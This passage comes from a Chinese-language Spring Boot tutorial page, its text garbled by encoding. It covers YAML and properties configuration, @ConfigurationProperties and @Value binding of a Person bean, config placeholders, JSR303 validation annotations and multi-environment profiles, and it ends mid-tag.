æŒ‡å®šçš„è‡ªåŠ¨é…ç½®å€¼</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509251304335.jpeg"></p><h4 id="SpringApplication"><a href="#SpringApplication" class="headerlink" title="SpringApplication"></a>SpringApplication</h4><p><strong><font style="color:rgba(0, 0, 0, 0.9);">è¿™ä¸ªç±»ä¸»è¦åšäº†ä»¥ä¸‹å››ä»¶äº‹æƒ…ï¼š</font></strong></p><p><font style="color:rgba(0, 0, 0, 0.9);">1ã€æ¨æ–­åº”ç”¨çš„ç±»å‹æ˜¯æ™®é€šçš„é¡¹ç›®è¿˜æ˜¯Webé¡¹ç›®</font></p><p><font style="color:rgba(0, 0, 0, 0.9);">2ã€æŸ¥æ‰¾å¹¶åŠ è½½æ‰€æœ‰å¯ç”¨åˆå§‹åŒ–å™¨ ï¼Œ è®¾ç½®åˆ°initializerså±æ€§ä¸­</font></p><p><font style="color:rgba(0, 0, 0, 0.9);">3ã€æ‰¾å‡ºæ‰€æœ‰çš„åº”ç”¨ç¨‹åºç›‘å¬å™¨ï¼Œè®¾ç½®åˆ°listenerså±æ€§ä¸­</font></p><p><font style="color:rgba(0, 0, 0, 0.9);">4ã€æ¨æ–­å¹¶è®¾ç½®mainæ–¹æ³•çš„å®šä¹‰ç±»ï¼Œæ‰¾åˆ°è¿è¡Œçš„ä¸»ç±»</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">SpringApplication.run(Springboot01HelloworldApplication.class, args);<br></code></pre></td></tr></table></figure><h1 id="3ã€SpringBoot-é…ç½®"><a href="#3ã€SpringBoot-é…ç½®" class="headerlink" title="3ã€SpringBoot é…ç½®"></a>3ã€SpringBoot é…ç½®</h1><p><font style="color:rgba(0, 0, 0, 0.9);">SpringBootä½¿ç”¨ä¸€ä¸ªå…¨å±€çš„é…ç½®æ–‡ä»¶ ï¼Œ é…ç½®æ–‡ä»¶åç§°æ˜¯å›ºå®šçš„</font></p><ul><li><font style="color:rgba(0, 0, 0, 0.9);">application.properties</font><ul><li><font style="color:rgba(0, 0, 0, 0.9);">è¯­æ³•ç»“æ„ ï¼škey&#x3D;value</font></li></ul></li><li><font style="color:rgba(0, 0, 0, 0.9);">application.yml</font><ul><li><font style="color:rgba(0, 0, 0, 0.9);">è¯­æ³•ç»“æ„ ï¼škeyï¼šç©ºæ ¼ value</font></li></ul></li></ul><p><strong><font style="color:rgba(0, 0, 0, 0.9);">é…ç½®æ–‡ä»¶çš„ä½œç”¨ ï¼š</font></strong><font style="color:rgba(0, 0, 0, 0.9);">ä¿®æ”¹SpringBootè‡ªåŠ¨é…ç½®çš„é»˜è®¤å€¼ï¼Œå› ä¸ºSpringBootåœ¨åº•å±‚éƒ½ç»™æˆ‘ä»¬è‡ªåŠ¨é…ç½®å¥½äº†ï¼›</font></p><h2 id="yamlæ¦‚è¿°"><a href="#yamlæ¦‚è¿°" class="headerlink" title="yamlæ¦‚è¿°"></a>yamlæ¦‚è¿°</h2><p><a href="https://www.ruanyifeng.com/blog/2016/07/yaml.html">YAML è¯­è¨€æ•™ç¨‹ - é˜®ä¸€å³°çš„ç½‘ç»œæ—¥å¿—</a></p><h2 id="yaml-è¯­æ³•"><a href="#yaml-è¯­æ³•" class="headerlink" title="yaml è¯­æ³•"></a>yaml è¯­æ³•</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># æ™®é€šçš„ key-value</span><br><span class="hljs-attr">name:</span> <span class="hljs-string">qwe</span><br><br><span class="hljs-comment"># å¯¹è±¡</span><br><span class="hljs-attr">student:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">qwe</span><br>  <span class="hljs-attr">age:</span> <span class="hljs-number">11</span><br><br><span class="hljs-attr">student:</span> &#123;<span class="hljs-attr">name:</span> <span class="hljs-string">qwe</span>, <span class="hljs-attr">age:</span> <span class="hljs-number">1</span>&#125;<br><br><span class="hljs-comment"># æ•°ç»„</span><br><span class="hljs-attr">pets:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">cat</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">dog</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">pig</span><br><br><span class="hljs-attr">pets:</span> [<span class="hljs-string">cat</span>,<span class="hljs-string">dog</span>,<span class="hljs-string">pig</span>]<br></code></pre></td></tr></table></figure><h2 id="yamlæ³¨å…¥é…ç½®æ–‡ä»¶"><a href="#yamlæ³¨å…¥é…ç½®æ–‡ä»¶" class="headerlink" title="yamlæ³¨å…¥é…ç½®æ–‡ä»¶"></a>yamlæ³¨å…¥é…ç½®æ–‡ä»¶</h2><p>**@ConfigurationProperties **ä½œç”¨ï¼šå°†é…ç½®æ–‡ä»¶ä¸­é…ç½®çš„æ¯ä¸€ä¸ªå±æ€§çš„å€¼ï¼Œæ˜ å°„åˆ°è¿™ä¸ªç»„ä»¶ä¸­ï¼›å‘Šè¯‰ SpringBoot å°†æœ¬ç±»ä¸­çš„æ‰€æœ‰å±æ€§å’Œé…ç½®æ–‡ä»¶ä¸­ç›¸å…³çš„é…ç½®è¿›è¡Œç»‘å®šå‚æ•° <strong>prefix &#x3D; â€œpersonâ€</strong> : å°†é…ç½®æ–‡ä»¶ä¸­çš„personä¸‹é¢çš„æ‰€æœ‰å±æ€§ä¸€ä¸€å¯¹åº”</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang.pojo;<br><br><span class="hljs-keyword">import</span> org.springframework.boot.context.properties.ConfigurationProperties;<br><span class="hljs-keyword">import</span> org.springframework.stereotype.Component;<br><br><span class="hljs-keyword">import</span> java.util.*;<br><br><span class="hljs-meta">@Component</span><br><span class="hljs-meta">@ConfigurationProperties(prefix = &quot;person&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br>    <span class="hljs-keyword">private</span> Boolean happy;<br>    <span class="hljs-keyword">private</span> Date birth;<br>    <span class="hljs-keyword">private</span> Map&lt;String,Object&gt; maps;<br>    <span class="hljs-keyword">private</span> List&lt;Object&gt; lists;<br>    <span class="hljs-keyword">private</span> Dog dog;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">()</span> &#123;&#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age, Date birth, Boolean happy, List&lt;Object&gt; lists, Map&lt;String, Object&gt; maps, Dog dog)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = age;<br>        <span class="hljs-built_in">this</span>.birth = birth;<br>        <span class="hljs-built_in">this</span>.happy = happy;<br>        <span class="hljs-built_in">this</span>.lists = lists;<br>        <span class="hljs-built_in">this</span>.maps = maps;<br>        <span class="hljs-built_in">this</span>.dog = dog;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> Boolean <span class="hljs-title function_">getHappy</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> happy;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setHappy</span><span class="hljs-params">(Boolean happy)</span> &#123;<br>        <span class="hljs-built_in">this</span>.happy = happy;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> Date <span class="hljs-title function_">getBirth</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> birth;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setBirth</span><span class="hljs-params">(Date birth)</span> &#123;<br>        <span class="hljs-built_in">this</span>.birth = birth;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> Map&lt;String, Object&gt; <span class="hljs-title function_">getMaps</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> maps;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setMaps</span><span class="hljs-params">(Map&lt;String, Object&gt; maps)</span> &#123;<br>        <span class="hljs-built_in">this</span>.maps = maps;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> List&lt;Object&gt; <span class="hljs-title function_">getLists</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> lists;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setLists</span><span class="hljs-params">(List&lt;Object&gt; lists)</span> &#123;<br>        <span class="hljs-built_in">this</span>.lists = lists;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> Dog <span class="hljs-title function_">getDog</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> dog;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setDog</span><span class="hljs-params">(Dog dog)</span> &#123;<br>        <span class="hljs-built_in">this</span>.dog = dog;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Person&#123;&quot;</span> +<br>        <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>        <span class="hljs-string">&quot;, age=&quot;</span> + age +<br>        <span class="hljs-string">&quot;, happy=&quot;</span> + happy +<br>        <span class="hljs-string">&quot;, birth=&quot;</span> + birth +<br>        <span class="hljs-string">&quot;, maps=&quot;</span> + maps +<br>        <span class="hljs-string">&quot;, lists=&quot;</span> + lists +<br>        <span class="hljs-string">&quot;, dog=&quot;</span> + dog +<br>        <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">server:</span><br>  <span class="hljs-attr">port:</span> <span class="hljs-number">8123</span><br><br><span class="hljs-attr">person:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">qwe</span><br>  <span class="hljs-attr">age:</span> <span class="hljs-number">1</span><br>  <span class="hljs-attr">happy:</span> <span class="hljs-literal">false</span><br>  <span class="hljs-attr">birth:</span> <span class="hljs-string">&quot;1009/09/08&quot;</span><br>  <span class="hljs-attr">maps:</span><br>    <span class="hljs-attr">k1:</span> <span class="hljs-string">v1</span><br>    <span class="hljs-attr">k2:</span> <span class="hljs-string">v2</span><br>  <span class="hljs-attr">lists:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">code</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-string">music</span><br>  <span class="hljs-attr">dog:</span><br>    <span class="hljs-attr">name:</span> <span class="hljs-string">wang</span><br>    <span class="hljs-attr">age:</span> <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.kuang;<br><br><span class="hljs-keyword">import</span> com.kuang.pojo.Person;<br><span class="hljs-keyword">import</span> org.junit.jupiter.api.Test;<br><span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;<br><span class="hljs-keyword">import</span> org.springframework.boot.test.context.SpringBootTest;<br><br><span class="hljs-meta">@SpringBootTest</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Springboot01HelloworldApplicationTests</span> &#123;<br><br>    <span class="hljs-meta">@Autowired</span><br>    <span class="hljs-keyword">private</span> Person person;<br><br>    <span class="hljs-meta">@Test</span><br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">contextLoads</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(person);<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>Person{name&#x3D;â€™qweâ€™, age&#x3D;1, happy&#x3D;false, birth&#x3D;Thu Sep 08 00:00:00 CST 1009, maps&#x3D;{k1&#x3D;v1, k2&#x3D;v2}, lists&#x3D;[code, music], dog&#x3D;Dog{name&#x3D;â€™wangâ€™, age&#x3D;1}}</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509251304357.png"></p><h2 id="åŠ è½½æŒ‡å®šçš„é…ç½®æ–‡ä»¶"><a href="#åŠ è½½æŒ‡å®šçš„é…ç½®æ–‡ä»¶" class="headerlink" title="åŠ è½½æŒ‡å®šçš„é…ç½®æ–‡ä»¶"></a>åŠ è½½æŒ‡å®šçš„é…ç½®æ–‡ä»¶</h2><p><strong><font style="color:rgba(0, 0, 0, 0.9);">@PropertySource ï¼š</font></strong><font style="color:rgba(0, 0, 0, 0.9);">åŠ è½½æŒ‡å®šçš„é…ç½®æ–‡ä»¶ï¼›</font></p><p><strong><font style="color:rgba(0, 0, 0, 0.9);">@configurationProperties</font></strong><font style="color:rgba(0, 0, 0, 0.9);">ï¼šé»˜è®¤ä»å…¨å±€é…ç½®æ–‡ä»¶ä¸­è·å–å€¼ï¼›</font></p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">name</span>=<span class="hljs-string">qaz</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//æŒ‡å®šåŠ è½½ person.propertiesæ–‡ä»¶</span><br><span class="hljs-meta">@PropertySource(value = &quot;classpath:person.properties&quot;)</span><br><span class="hljs-meta">@Component</span><br><span class="hljs-comment">//@ConfigurationProperties(prefix = &quot;person&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br><br>    <span class="hljs-meta">@Value(&quot;$&#123;name&#125;&quot;)</span><br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br>    <span class="hljs-keyword">private</span> Boolean happy;<br>    <span class="hljs-keyword">private</span> Date birth;<br>    <span class="hljs-keyword">private</span> Map&lt;String,Object&gt; maps;<br>    <span class="hljs-keyword">private</span> List&lt;Object&gt; lists;<br>    <span class="hljs-keyword">private</span> Dog dog;<br></code></pre></td></tr></table></figure><hr><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509251304970.png"></p><h2 id="é…ç½®æ–‡ä»¶å ä½ç¬¦"><a href="#é…ç½®æ–‡ä»¶å ä½ç¬¦" class="headerlink" title="é…ç½®æ–‡ä»¶å ä½ç¬¦"></a>é…ç½®æ–‡ä»¶å ä½ç¬¦</h2><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">person:</span><br>    <span class="hljs-attr">name:</span> <span class="hljs-string">qwe$&#123;random.uuid&#125;</span> <span class="hljs-comment"># éšæœºuuid</span><br>    <span class="hljs-attr">age:</span> <span class="hljs-string">$&#123;random.int&#125;</span>  <span class="hljs-comment"># éšæœºint</span><br>    <span class="hljs-attr">happy:</span> <span class="hljs-literal">false</span><br>    <span class="hljs-attr">birth:</span> <span class="hljs-number">2000</span><span class="hljs-string">/01/01</span><br>    <span class="hljs-attr">maps:</span> &#123;<span class="hljs-attr">k1:</span> <span class="hljs-string">v1</span>,<span class="hljs-attr">k2:</span> <span class="hljs-string">v2</span>&#125;<br>    <span class="hljs-attr">lists:</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">code</span><br>      <span class="hljs-bullet">-</span> <span class="hljs-string">music</span><br>    <span class="hljs-attr">dog:</span><br>      <span class="hljs-attr">name:</span> <span class="hljs-string">$&#123;person.hello:other&#125;_æ—ºè´¢</span><br>      <span class="hljs-attr">age:</span> <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509251304522.png"></p><h3 id="å°ç»“ï¼š-1"><a href="#å°ç»“ï¼š-1" class="headerlink" title="å°ç»“ï¼š"></a>å°ç»“ï¼š</h3><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202509251304628.webp"></p><p><font style="color:rgba(0, 0, 0, 0.9);">JSR303æ•°æ®æ ¡éªŒ ï¼Œ å¯ä»¥åœ¨å­—æ®µæ˜¯å¢åŠ ä¸€å±‚è¿‡æ»¤å™¨éªŒè¯ ï¼Œ å¯ä»¥ä¿è¯æ•°æ®çš„åˆæ³•æ€§</font></p><p><font style="color:rgba(0, 0, 0, 0.9);">æ¾æ•£ç»‘å®šï¼šyml ä¸­å†™çš„ last-name å’Œ lastNameæ˜¯ä¸€æ ·çš„</font></p><p><font style="color:rgba(0, 0, 0, 0.9);">å¤æ‚ç±»å‹å°è£…ï¼Œymlä¸­å¯ä»¥å°è£…å¯¹è±¡ ï¼Œ ä½¿ç”¨valueå°±ä¸æ”¯æŒ</font></p><h2 id="JSR303æ•°æ®æ ¡éªŒ"><a href="#JSR303æ•°æ®æ ¡éªŒ" class="headerlink" title="JSR303æ•°æ®æ ¡éªŒ"></a>JSR303æ•°æ®æ ¡éªŒ</h2><p><font style="color:rgba(0, 0, 0, 0.9);">å­—æ®µæ˜¯å¢åŠ ä¸€å±‚è¿‡æ»¤å™¨éªŒè¯ ï¼Œ å¯ä»¥ä¿è¯æ•°æ®çš„åˆæ³•æ€§</font></p><p>å¸¸è§å‚æ•°ï¼š</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">@NotNull(message=&quot;åå­—ä¸èƒ½ä¸ºç©º&quot;)</span><br><span class="hljs-string">private</span> <span class="hljs-string">String</span> <span class="hljs-string">userName;</span><br><span class="hljs-string">@Max(value=120,message=&quot;å¹´é¾„æœ€å¤§ä¸èƒ½æŸ¥è¿‡120&quot;)</span><br><span class="hljs-string">private</span> <span class="hljs-string">int</span> <span class="hljs-string">age;</span><br><span class="hljs-string">@Email(message=&quot;é‚®ç®±æ ¼å¼é”™è¯¯&quot;)</span><br><span class="hljs-string">private</span> <span class="hljs-string">String</span> <span class="hljs-string">email;</span><br><br><span class="hljs-comment">#ç©ºæ£€æŸ¥</span><br><span class="hljs-string">@Null</span>       <span class="hljs-comment">#éªŒè¯å¯¹è±¡æ˜¯å¦ä¸ºnull</span><br><span class="hljs-string">@NotNull</span>    <span class="hljs-comment">#éªŒè¯å¯¹è±¡æ˜¯å¦ä¸ä¸ºnull, æ— æ³•æŸ¥æ£€é•¿åº¦ä¸º0çš„å­—ç¬¦ä¸²</span><br><span class="hljs-string">@NotBlank</span>   <span class="hljs-comment">#æ£€æŸ¥çº¦æŸå­—ç¬¦ä¸²æ˜¯ä¸æ˜¯Nullè¿˜æœ‰è¢«Trimçš„é•¿åº¦æ˜¯å¦å¤§äº0,åªå¯¹å­—ç¬¦ä¸²,ä¸”ä¼šå»æ‰å‰åç©ºæ ¼.</span><br><span class="hljs-string">@NotEmpty</span>   <span class="hljs-comment">#æ£€æŸ¥çº¦æŸå…ƒç´ æ˜¯å¦ä¸ºNULLæˆ–è€…æ˜¯EMPTY.</span><br>    <br><span class="hljs-comment">#Booelanæ£€æŸ¥</span><br><span class="hljs-string">@AssertTrue</span>     <span class="hljs-comment">#éªŒè¯ Boolean å¯¹è±¡æ˜¯å¦ä¸º true  </span><br><span class="hljs-string">@AssertFalse</span>    <span class="hljs-comment">#éªŒè¯ Boolean å¯¹è±¡æ˜¯å¦ä¸º false  </span><br>    <br><span class="hljs-comment">#é•¿åº¦æ£€æŸ¥</span><br><span class="hljs-string">@Size(min=,</span> <span class="hljs-string">max=)</span> <span class="hljs-comment">#éªŒè¯å¯¹è±¡ï¼ˆArray,Collection,Map,Stringï¼‰é•¿åº¦æ˜¯å¦åœ¨ç»™å®šçš„èŒƒå›´ä¹‹å†…  </span><br><span class="hljs-string">@Length(min=,</span> <span class="hljs-string">max=)</span> <span class="hljs-string">string</span> <span class="hljs-string">is</span> <span class="hljs-string">between</span> <span class="hljs-string">min</span> <span class="hljs-string">and</span> <span class="hljs-string">max</span> <span class="hljs-string">included.</span><br><br><span class="hljs-comment">#æ—¥æœŸæ£€æŸ¥</span><br><span class="hljs-string">@Past</span>       <span class="hljs-comment">#éªŒè¯ Date å’Œ Calendar å¯¹è±¡æ˜¯å¦åœ¨å½“å‰æ—¶é—´ä¹‹å‰  </span><br><span class="hljs-string">@Future</span>     <span class="hljs-comment">#éªŒè¯ Date å’Œ Calendar å¯¹è±¡æ˜¯å¦åœ¨å½“å‰æ—¶é—´ä¹‹å  </span><br><span class="hljs-string">@Pattern</span>    <span class="hljs-comment">#éªŒè¯ String å¯¹è±¡æ˜¯å¦ç¬¦åˆæ­£åˆ™è¡¨è¾¾å¼çš„è§„åˆ™</span><br></code></pre></td></tr></table></figure><h2 id="å¤šç¯å¢ƒåˆ‡æ¢"><a href="#å¤šç¯å¢ƒåˆ‡æ¢" class="headerlink" title="å¤šç¯å¢ƒåˆ‡æ¢"></a>å¤šç¯å¢ƒåˆ‡æ¢</h2><p><font style="color:rgba(0, 0, 0, 0.9);">profileæ˜¯Springå¯¹ä¸åŒç¯å¢ƒæä¾›ä¸åŒé…ç½®åŠŸèƒ½çš„æ”¯æŒï¼Œå¯ä»¥é€šè¿‡æ¿€æ´»ä¸åŒçš„ç¯å¢ƒç‰ˆæœ¬ï¼Œå®ç°å¿«é€Ÿåˆ‡æ¢ç¯å¢ƒï¼›</font></p><h3 id="å¤šé…ç½®æ–‡ä»¶"><a href="#å¤šé…ç½®æ–‡ä»¶" class="headerlink" title="å¤šé…ç½®æ–‡ä»¶"></a>å¤šé…ç½®æ–‡ä»¶</h3><p><font style="color:rgba(0, 0, 0, 0.9);">æˆ‘ä»¬åœ¨ä¸»é…ç½®æ–‡ä»¶ç¼–å†™çš„æ—¶å€™ï¼Œæ–‡ä»¶åå¯ä»¥æ˜¯ application-{profile}.properties&#x2F;yml , ç”¨æ¥æŒ‡å®šå¤šä¸ªç¯å¢ƒç‰ˆæœ¬ï¼›</font></p><p><strong><font style="color:rgba(0, 0, 0, 0.9);">ä¾‹å¦‚ï¼š</font></strong></p><p><font style="color:rgba(0, 0, 0, 0.9);">application-test.properties ä»£è¡¨æµ‹è¯•ç¯å¢ƒé…ç½®</font></p><p><font style="color:rgba(0, 0, 0, 0.9);">application-dev.properties ä»£è¡¨å¼€å‘ç¯å¢ƒé…ç½®</font></p><p><font style="color:rgba(0, 0, 0, 0.9);">ä½†æ˜¯Springbootå¹¶ä¸ä¼šç›´æ¥å¯åŠ¨è¿™äº›é…ç½®æ–‡ä»¶ï¼Œå®ƒ</font><strong><font style="color:rgba(0, 0, 0, 0.9);">é»˜è®¤ä½¿ç”¨application.propertiesä¸»é…ç½®æ–‡ä»¶</font></strong><font style="color:rgba(0, 0, 0, 0.9);">ï¼›</font></p><h3 id="yamlçš„å¤šæ–‡æ¡£å—"><a href="#yamlçš„å¤šæ–‡æ¡£å—" class="headerlink" title="yamlçš„å¤šæ–‡æ¡£å—"></a>yamlçš„å¤šæ–‡æ¡£å—</h3><p><font style="color:rgba(0, 0, 0, 0.9);">å’Œpropertiesé…ç½®æ–‡ä»¶ä¸­ä¸€æ ·ï¼Œä½†æ˜¯ä½¿ç”¨ymlå»å®ç°ä¸éœ€è¦åˆ›å»ºå¤šä¸ªé…ç½®æ–‡ä»¶</font></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">server:</span>  <br>  <span class="hljs-attr">port:</span> <span class="hljs-number">8081</span><br><span 